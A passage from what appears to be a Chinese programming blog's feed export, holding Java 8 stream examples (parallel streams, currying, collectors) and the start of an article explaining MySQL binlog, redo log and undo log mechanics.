默认线程池 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createParallelStream</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        IntStream.range(<span class="number">1</span>, <span class="number">100</span>).parallel().forEach(ParallelStream::printDebug);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * 特性二 并行再串行 以最后一个流为准 */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">feature2</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        IntStream.range(<span class="number">1</span>, <span class="number">100</span>).parallel().peek(ParallelStream::printDebug).sequential().peek(ParallelStream::printDebug2).count();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * 特性三 默认线程池与设置默认线程数 */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">feature3</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        System.setProperty(<span class="string">"java.util.concurrent.ForkJoinPool.common.parallelism"</span>,<span class="string">"3"</span>);</span><br><span class="line">        IntStream.range(<span class="number">1</span>, <span class="number">100</span>).parallel().forEach(ParallelStream::printDebug);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * 特性四 自定义线程池 防止线程被阻塞 */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">feature4</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        ForkJoinPool forkJoinPool = <span class="keyword">new</span> ForkJoinPool();</span><br><span class="line">        forkJoinPool.submit(() -&gt; IntStream.range(<span class="number">1</span>, <span class="number">100</span>).parallel().forEach(ParallelStream::printDebug));</span><br><span class="line">        forkJoinPool.shutdown();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123; </span><br><span class="line">   </span><br><span class="line">            Thread.sleep(<span class="number">10000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123; </span><br><span class="line">   </span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printDebug</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123; </span><br><span class="line">   </span><br><span class="line"><span class="comment">// System.out.println(i);</span></span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">"debug:"</span> + i);</span><br><span class="line">        <span class="keyword">try</span> &#123; </span><br><span class="line">   </span><br><span class="line">            Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123; </span><br><span class="line">   </span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printDebug2</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        System.err.println(i);</span><br><span class="line">        <span class="keyword">try</span> &#123; </span><br><span class="line">   </span><br><span class="line">            Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123; </span><br><span class="line">   </span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="级联表达式与柯里化"><a href="#级联表达式与柯里化" class="headerlink" title="级联表达式与柯里化"></a>级联表达式与柯里化</h2><p>简单来说就是将一个复杂表达式拆解为多个简单表达式，比如数学中的： y=5！ 可以等价为 y = 1 <em> 2 </em> 3 <em> 4 </em> 5</p><p>注意：这里涉及一个基础概念数据不变性，说白了就是匿名类中运用到外部变量时，外部变量需要是常量。细心的你会发现在级联表达式中外部变量均为常量。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** * 级联表达式和柯里化 * * <span class="doctag">@author</span> 旭旭 * <span class="doctag">@create</span> 2018-08-12 1:09 **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CurryDemo</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line">        <span class="comment">//级联表达式</span></span><br><span class="line">        Function&lt;Integer,Function&lt;Integer,Integer&gt;&gt; fun = x -&gt; y -&gt; x + y;</span><br><span class="line">        <span class="comment">//柯里化（Currying）是把接受多个参数的函数变换成接受一个单一参数(最初函数的第一个参数)的函数</span></span><br><span class="line">        <span class="comment">//柯里化的意义：函数标准化</span></span><br><span class="line">        <span class="comment">//高阶函数：返回函数的函数</span></span><br><span class="line">        System.out.println(fun.apply(<span class="number">2</span>).apply(<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line">        Function&lt;Integer,Function&lt;Integer,Function&lt;Integer,Integer&gt;&gt;&gt; fun2 = x -&gt; y -&gt; z -&gt; x + y + z;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="收集器（终止操作因为内容较多提出来说明）"><a href="#收集器（终止操作因为内容较多提出来说明）" class="headerlink" title="收集器（终止操作因为内容较多提出来说明）"></a>收集器（终止操作因为内容较多提出来说明）</h2><p>终止操作中将数据以集合方式回收，可以对数据进行分类统计等</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** * 收集器 * * <span class="doctag">@author</span> 旭旭 * <span class="doctag">@create</span> 2018-08-18 23:43 **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CollectorsStream</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line">        List&lt;Student&gt; students = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        students.add(<span class="keyword">new</span> Student(<span class="string">"一号"</span>,<span class="number">7</span>,<span class="keyword">true</span>,<span class="string">"一年级"</span>));</span><br><span class="line">        students.add(<span class="keyword">new</span> Student(<span class="string">"二号"</span>,<span class="number">8</span>,<span class="keyword">true</span>,<span class="string">"二年级"</span>));</span><br><span class="line">        students.add(<span class="keyword">new</span> Student(<span class="string">"三号"</span>,<span class="number">8</span>,<span class="keyword">false</span>,<span class="string">"二年级"</span>));</span><br><span class="line">        students.add(<span class="keyword">new</span> Student(<span class="string">"四号"</span>,<span class="number">9</span>,<span class="keyword">true</span>,<span class="string">"三年级"</span>));</span><br><span class="line">        students.add(<span class="keyword">new</span> Student(<span class="string">"五号"</span>,<span class="number">7</span>,<span class="keyword">false</span>,<span class="string">"一年级"</span>));</span><br><span class="line">        students.add(<span class="keyword">new</span> Student(<span class="string">"六号"</span>,<span class="number">8</span>,<span class="keyword">true</span>,<span class="string">"二年级"</span>));</span><br><span class="line">        students.add(<span class="keyword">new</span> Student(<span class="string">"七号"</span>,<span class="number">10</span>,<span class="keyword">true</span>,<span class="string">"四年级"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// dataToList(students);</span></span><br><span class="line"><span class="comment">// summary(students);</span></span><br><span class="line"><span class="comment">// partitioning(students);</span></span><br><span class="line">        group(students);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * 获取某一数据的集合 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dataToList</span><span class="params">(List&lt;Student&gt; students)</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        List&lt;Integer&gt; list = students.stream().map(Student::getAge).collect(Collectors.toList());</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * 获取某一数据的汇总值 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">summary</span><span class="params">(List&lt;Student&gt; students)</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        IntSummaryStatistics collect = students.stream().collect(Collectors.summarizingInt(Student::getAge));</span><br><span class="line">        System.out.println(collect);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * 根据某一数据分类 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">partitioning</span><span class="params">(List&lt;Student&gt; students)</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        Map&lt;Boolean, List&lt;Student&gt;&gt; collect = students.stream().collect(Collectors.partitioningBy(x -&gt; x.isGender()));</span><br><span class="line">        System.out.println(collect);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * 根据某一数据分组 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">group</span><span class="params">(List&lt;Student&gt; students)</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        Map&lt;String, Long&gt; collect = students.stream().collect(Collectors.groupingBy(Student::getGrade, Collectors.counting()));</span><br><span class="line">        System.out.println(collect);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Stream特性"><a href="#Stream特性" class="headerlink" title="Stream特性"></a>Stream特性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** * 流运行机制，基本特性 * * <span class="doctag">@author</span> 旭旭 * <span class="doctag">@create</span> 2018-08-19 22:51 **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FeatureStream</span> </span>&#123; </span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123; </span><br><span class="line">   </span><br><span class="line"><span class="comment">// feature123();</span></span><br><span class="line">        feature46();</span><br><span class="line"><span class="comment">// feature5();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * 特性一 所有操作都是链式调用一个操作只迭代一次 * 特性二 每一个中间流返回一个新的流，里面的sourceStage都指向同一个地方就是Head * 特性三 Head -&gt; NextStage -&gt; NextStage -&gt; null */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">feature123</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        Stream&lt;Integer&gt; integerStream = Stream.generate(random::nextInt)</span><br><span class="line">                .limit(<span class="number">500</span>)</span><br><span class="line">                .peek(x -&gt; System.out.println(<span class="string">"peek -&gt; "</span> + x))</span><br><span class="line">                .filter(x -&gt; &#123; </span><br><span class="line">   System.out.println(<span class="string">"filter -&gt; "</span> + x);<span class="keyword">return</span> x &gt; <span class="number">100000</span>;&#125;);</span><br><span class="line">        integerStream.count();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * 特性四 有状态操作（多个参数操作），会把无状态操作阶段分隔，单独处理。 * parallel / sequetial 这个2个操作也是中间操作，但是他们不创建新的流，而是修改 * Head的并行状态，所以多次调用时只会生效最后一个。 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">feature46</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        Stream&lt;Integer&gt; integerStream = Stream.generate(random::nextInt)</span><br><span class="line">                .limit(<span class="number">500</span>)</span><br><span class="line">                .peek(x -&gt; System.out.println(<span class="string">"peek -&gt; "</span> + x))</span><br><span class="line">                .filter(x -&gt; &#123; </span><br><span class="line">   System.out.println(<span class="string">"filter -&gt; "</span> + x);<span class="keyword">return</span> x &gt; <span class="number">100000</span>;&#125;)</span><br><span class="line">                .sorted((x,y) -&gt; &#123; </span><br><span class="line">   System.out.println(<span class="string">"sorted -&gt; "</span> + x);<span class="keyword">return</span> x - y;&#125;)</span><br><span class="line">                .filter(x -&gt; &#123; </span><br><span class="line">   System.out.println(<span class="string">"filter -&gt; "</span> + x);<span class="keyword">return</span> x &gt; <span class="number">100000</span>;&#125;)</span><br><span class="line"><span class="comment">// .parallel()</span></span><br><span class="line">                ;</span><br><span class="line">        integerStream.count();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** * 特性五 有状态操作并行环境下不一定能并行操作 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">feature5</span><span class="params">()</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        Stream&lt;Integer&gt; integerStream = Stream.generate(random::nextInt)</span><br><span class="line">                .limit(<span class="number">500</span>)</span><br><span class="line">                .peek(x -&gt; print(<span class="string">"peek -&gt; "</span> + x))</span><br><span class="line">                .filter(x -&gt; &#123; </span><br><span class="line">   print(<span class="string">"filter -&gt; "</span> + x);<span class="keyword">return</span> x &gt; <span class="number">100000</span>;&#125;)</span><br><span class="line">                .sorted((x,y) -&gt; &#123; </span><br><span class="line">   print(<span class="string">"sorted -&gt; "</span> + x);<span class="keyword">return</span> x - y;&#125;)</span><br><span class="line">                .filter(x -&gt; &#123; </span><br><span class="line">   print(<span class="string">"filter -&gt; "</span> + x);<span class="keyword">return</span> x &gt; <span class="number">100000</span>;&#125;)</span><br><span class="line">                .parallel();</span><br><span class="line">        integerStream.count();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String x)</span></span>&#123; </span><br><span class="line">   </span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">" "</span> + x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql日志bingLog,redoLog,undoLog,java监听binlog</title>
      <link href="/2023/04/17/mysql%E6%97%A5%E5%BF%97bingLog-redoLog-undoLog/"/>
      <url>/2023/04/17/mysql%E6%97%A5%E5%BF%97bingLog-redoLog-undoLog/</url>
      
        <content type="html"><![CDATA[<h2 id="binlog日志"><a href="#binlog日志" class="headerlink" title="binlog日志"></a>binlog日志</h2><p>binlog用于记录数据库执行的写入性操作(不包括查询)信息，以二进制的形式保存在磁盘中。binlog是mysql的逻辑日志，并且由Server层进行记录，使用任何存储引擎的mysql数据库都会记录binlog日志。</p><ul><li>逻辑日志：可以简单理解为记录的就是sql语句。</li><li>物理日志：因为mysql数据最终是保存在数据页中的，物理日志记录的就是数据页变更。</li></ul><p>binlog是通过追加的方式进行写入的，可以通过max_binlog_size参数设置每个binlog文件的大小，当文件大小达到给定值之后，会生成新的文件来保存日志。</p><h3 id="binlog使用场景"><a href="#binlog使用场景" class="headerlink" title="binlog使用场景"></a>binlog使用场景</h3><p>在实际应用中，binlog的主要使用场景有两个，分别是主从复制和数据恢复。</p><ul><li>主从复制：在Master端开启binlog，然后将binlog发送到各个Slave端，Slave端重放binlog从而达到主从数据一致。</li><li>数据恢复：通过使用mysqlbinlog工具来恢复数据。</li></ul><h3 id="binlog刷盘时机"><a href="#binlog刷盘时机" class="headerlink" title="binlog刷盘时机"></a>binlog刷盘时机</h3><p>对于InnoDB存储引擎而言，只有在事务提交时才会记录biglog，此时记录还在内存中，那么biglog是什么时候刷到磁盘中的呢？mysql通过sync_binlog参数控制biglog的刷盘时机，取值范围是0-N：</p><ul><li>0：不去强制要求，由系统自行判断何时写入磁盘；</li><li>1：每次commit的时候都要将binlog写入磁盘；</li><li>N：每N个事务，才会将binlog写入磁盘。</li></ul><p>从上面可以看出，sync_binlog最安全的是设置是1，这也是MySQL 5.7.7之后版本的默认值。但是设置一个大一些的值可以提升数据库性能，因此实际情况下也可以将值适当调大，牺牲一定的一致性来获取更好的性能。</p><h3 id="binlog日志格式"><a href="#binlog日志格式" class="headerlink" title="binlog日志格式"></a>binlog日志格式</h3><p>binlog日志有三种格式，分别为STATMENT、ROW和MIXED。</p><blockquote><p>在 MySQL 5.7.7之前，默认的格式是STATEMENT，MySQL 5.7.7之后，默认值是ROW。日志格式通过binlog-format指定。</p></blockquote><p><strong>STATMENT</strong></p><p>基于SQL语句的复制(statement-based replication, SBR)，每一条会修改数据的sql语句会记录到binlog中。</p><ul><li>优点：不需要记录每一行的变化，减少了binlog日志量，节约了IO, 从而提高了性能；</li><li>缺点：在某些情况下会导致主从数据不一致，比如执行sysdate()、sleep()等。</li></ul><p><strong>ROW</strong></p><p>基于行的复制(row-based replication, RBR)，不记录每条sql语句的上下文信息，仅需记录哪条数据被修改了。</p><ul><li>优点：不会出现某些特定情况下的存储过程、或function、或trigger的调用和触发无法被正确复制的问题；</li><li>缺点：会产生大量的日志，尤其是alter table的时候会让日志暴涨</li></ul><p><strong>MIXED</strong></p><p>基于STATMENT和ROW两种模式的混合复制(mixed-based replication, MBR)，一般的复制使用STATEMENT模式保存binlog，对于STATEMENT模式无法复制的操作使用ROW模式保存binlog</p><h2 id="redolog日志"><a href="#redolog日志" class="headerlink" title="redolog日志"></a>redolog日志</h2><h3 id="为什么需要redolog"><a href="#为什么需要redolog" class="headerlink" title="为什么需要redolog"></a>为什么需要redolog</h3><p>我们都知道，事务的四大特性里面有一个是持久性，具体来说就是只要事务提交成功，那么对数据库做的修改就被永久保存下来了，不可能因为任何原因再回到原来的状态。那么mysql是如何保证一致性的呢？最简单的做法是在每次事务提交的时候，将该事务涉及修改的数据页全部刷新到磁盘中。但是这么做会有严重的性能问题，主要体现在两个方面：</p><ul><li>因为Innodb是以页为单位进行磁盘交互的，而一个事务很可能只修改一个数据页里面的几个字节，这个时候将完整的数据页刷到磁盘的话，太浪费资源了！</li><li>一个事务可能涉及修改多个数据页，并且这些数据页在物理上并不连续，使用随机IO写入性能太差！</li></ul><p>因此mysql设计了redo log，具体来说就是只记录事务对数据页做了哪些修改，这样就能完美地解决性能问题了(相对而言文件更小并且是顺序IO)。</p><h3 id="redolog-在磁盘里的结构"><a href="#redolog-在磁盘里的结构" class="headerlink" title="redolog 在磁盘里的结构"></a>redolog 在磁盘里的结构</h3><p>redolog 在内存中的存放位置叫 log buffer，我们为了了解 redolog 应该在哪个页的哪个偏移量写，提供了一个叫 buf_free 的全局变量，该变量指明后续写入的 redo 日志应该写到 log buffer 的哪个位置</p><p>那 redolog 在磁盘中又是如何存储的呢？</p><p>硬盘上存储的 redo log 日志文件不只一个，而是以一个日志文件组的形式出现的，每个的 redo 日志文件的大小都是一样的</p><p>比如可以配置为一组4个文件，每个文件的大小是 1GB，整个 redo log 日志文件组可以记录 4G 的内容</p><p>每个文件中都包含了多个页，并且这些页负责的内容可能不一样，每个文件的前2048个字节（也就是前四页）用来存储一些管理信息，之后的页就是用来存储 redolog 的普通页了</p><p>日志文件组采用的是环形数组形式，从头开始写，写到末尾又回到头循环写.为了管理这个日志文件组，我们显然需要一些全局变量，比如记录了当前写在哪里的偏移量，一共写了多少数据等等内容</p><h3 id="redolog-相关全局变量"><a href="#redolog-相关全局变量" class="headerlink" title="redolog 相关全局变量"></a>redolog 相关全局变量</h3><p>lsn，也就是 log sequence number 这个全局变量是记录当前总共写入的 redo 日志量的。在 mysql 开机时，这个值为 8704（一条数据都没写入 lsn 就是8704）。每次写入 x 字节的数据，这个值就加 x。同时，他还会将遇到的 log block header 和 log block trailer 占用的字节数加上（也就是页头和页尾占用的字节数）</p><p>而 buf_free 是下一次写入的记录的偏移量，一边写一边后移，它用来记录当前事务产生的 redo log 文件</p><p>flushed_to_disk_lsn 是用来标记当前 log buffer 中已经有那些日志被刷新到磁盘中了，该值表达的是内存中该值一开始也是8704，因此 lsn &gt;= flushed_to_disk_lsn。log buffer 就是在磁盘中存放 redolog 的地方，log buffer 比之日志文件组就类似于 buffer pool 比之磁盘中的 Innodb</p><p>checkpoint 指的是一次刷新全局变量 checkpoint_lsn 的操作，MySQL 中可以使用 lsn 来唯一确定 redolog 位置，而 checkpoint_lsn 就指向当前可以被擦除的位置。日志文件组的大小是有限的，我们不得不循环使用日志文件组中的文件，但是如果某些日志在该日志代表的数据被刷入磁盘之前就被清理掉了，日志就没有意义了。因此可以被擦除的地方就是数据已经刷入磁盘的地方，一边擦一边往后推移，MySQL 加载日志文件组恢复数据时，会清空加载过的 redo log 记录。如果 MySQL 一直不崩溃，redolog 记录满了的话，MySQL会自动刷盘并且删除一些 redo log 记录，让 checkpoint_lsn 向后推</p><p>注意，执行一次 checkpoint 与将脏页刷新到磁盘中是不同步的，因此 checkpoint_lsn 不能代表刷新到磁盘中的数据的最新位置</p><h3 id="redolog-恢复数据库的过程"><a href="#redolog-恢复数据库的过程" class="headerlink" title="redolog 恢复数据库的过程"></a>redolog 恢复数据库的过程</h3><p>至此，我们对数据库有了一个完整的日志记录，那如何使用这个日志记录功能呢，我们如何将数据从这个日志文件组中取出来并且用于恢复数据库呢</p><p>由于之前的全局变量与日志文件组配合记录，在 MySQL 中已经有了充足的信息。我们可以拿到需要恢复的起点（全局变量 checkpoint_lsn），和恢复的终点（可以用 lsn 来表示）。这两个值都能唯一确定一个日志文件组中的位置，并且里面的数据都保证正确性（每一条数据的末尾都有唯一标识），不会出现没有被刷入磁盘的数据对应的日志被刷掉的情况（checkpoint）</p><p>获取到日志后，我们可以一条条读取数据并且恢复，但是 MySQL 的设计者有更加快速的方法，将每个日志的 spaceID 与 page number 计算出哈希值并且存入 hash 表中，如果有多个 spaceID 与 page number 都相同的日志，将它们放入一个槽中。这样遍历槽，就可以一次性将一个页面恢复好，从而避免很多随机 IO，加快了恢复速度</p><p>这么恢复还有一点要注意，我们需要根据时间来恢复，不然最终的数据不保证正确性。同时，由于 checkpoint_lsn 与刷入磁盘的机制不一样，因此可能出现数据已经刷入了，但是日志还需要重新操作一遍的情况。重新操作一遍不会导致任何错误，但是可以优化掉这些过程，在每个页面中的文件头有个 FIL_PAGE_LSN 的属性，该属性记录了最新一次对该页面修改的日志的 lsn。我们只需要简单的判断就可以略过重新写一遍的过程了</p><h2 id="undolog日志"><a href="#undolog日志" class="headerlink" title="undolog日志"></a>undolog日志</h2><p>数据库事务四大特性中有一个是原子性，具体来说就是 原子性是指对数据库的一系列操作，要么全部成功，要么全部失败，不可能出现部分成功的情况。</p><p>实际上，原子性底层就是通过undo log实现的。undo log主要记录了数据的逻辑变化，比如一条INSERT语句，对应一条DELETE的undo log，对于每个UPDATE语句，对应一条相反的UPDATE的undo log，这样在发生错误时，就能回滚到事务之前的数据状态。</p><h3 id="undolog-的作用"><a href="#undolog-的作用" class="headerlink" title="undolog 的作用"></a>undolog 的作用</h3><p><strong>为什么有了 redolog 还需要 undolog？</strong>这就要从磁盘性能的优化说起</p><p>Commit Logging 有一个巨大的先天缺陷：所有对数据的真实修改都必须发生在事务提交以后，即日志写入了 Commit Record 之后。在此之前，即使磁盘有足够空闲，即使某个事务修改的数据量非常庞大，占用了大量的内存缓冲区，无论何种理由，都决不允许在事务提交之前就修改磁盘上的数据，这一点是 Commit Logging 成立的前提（因为我们我们不能使用 redolog 删除错误的记录，只能用它重做正确的记录），却对提升数据库的性能十分不利。为此，ARIES 提出了“提前写入日志”（Write-Ahead Logging）的日志改进方案，所谓“提前写入”（Write-Ahead），就是允许在事务提交之前写入变动数据的意思</p><p>Write-Ahead Logging 按照事务提交时点，将何时写入变动数据划分为 FORCE 和 STEAL 两类情况<br>·FORCE：当事务提交后，要求变动数据必须同时完成写入则称为 FORCE，如果不强制变动数据必须同时完成写入则称为 NO-FORCE<br>·STEAL：在事务提交前，允许变动数据提前写入则称为 STEAL，不允许则称为 NO-STEAL</p><p>Write-Ahead Logging 允许 NO-FORCE，也允许 STEAL，它给出的解决办法是增加了另一种被称为 Undo Log 的日志类型，当变动数据写入磁盘前，必须先记录 Undo Log，注明修改了哪个位置的数据、从什么值改成什么值等，以便在事务回滚或者崩溃恢复时根据 Undo Log 对提前写入的数据变动进行擦除</p><p>由于 Undo Log 的加入，Write-Ahead Logging 在崩溃恢复时会经历以下三个阶段</p><p>分析阶段（Analysis）：该阶段从最后一次检查点（Checkpoint，可理解为在这个点之前所有应该持久化的变动都已安全落盘）开始扫描日志，找出所有没有 End Record 的事务，组成待恢复的事务集合，这个集合至少会包括事务表（Transaction Table）和脏页表（Dirty Page Table）两个组成部分<br>重做阶段（Redo）：该阶段依据分析阶段中产生的待恢复的事务集合来重演历史（Repeat History），具体操作是找出所有包含 Commit Record 的日志，将这些日志修改的数据写入磁盘，写入完成后在日志中增加一条 End Record，然后移出待恢复事务集合<br>回滚阶段（Undo）：该阶段处理经过分析、重做阶段后剩余的恢复事务集合，此时剩下的都是需要回滚的事务，它们被称为 Loser，根据 Undo Log 中的信息，将已经提前写入磁盘的信息重新改写回去，以达到回滚这些 Loser 事务的目的</p><h3 id="undolog-的链表"><a href="#undolog-的链表" class="headerlink" title="undolog 的链表"></a>undolog 的链表</h3><p>一个页面只能存储一种类型的 undo 日志，不可以混合存储，之所以做出区分，是因为 insert 类型的日志可以在事务提交后直接删除，而 update 类型的由于需要为 MVCC 服务，因此要区别对待</p><p>trx_undo_page_start：第一条undo日志在本页面中的起始偏移量<br>trx_undo_page_free：最后一条undo日志结束时偏移量<br>trx_undo_page_node：链表节点结构<br>从页面的角度上来说，需要注意的点就这些了，但是从事务的角度上说，知识点还没结束。一个事务可能产生很多日志，这些日志在一个页面中可能放不下，那么就需要放到更多的页面中，这些页面就通过 trx_undo_page_node 形成了一个链表</p><p>链表中的第一个 undo 页面称为 first undo page，其余称为 normal undo page，因为第一个页面除了 undo page header 还有一些其他的管理信息，即 undo log segment header</p><p>一个事务的执行过程中，增删改的操作都会有，因为一个 undo 页面只能存放一种类型，所以一个事务的执行过程中可能有两种链表，一个是 insert undo 链表，一个是 update undo 链表</p><p>此外，Innodb 还规定，普通表和临时表的 undo 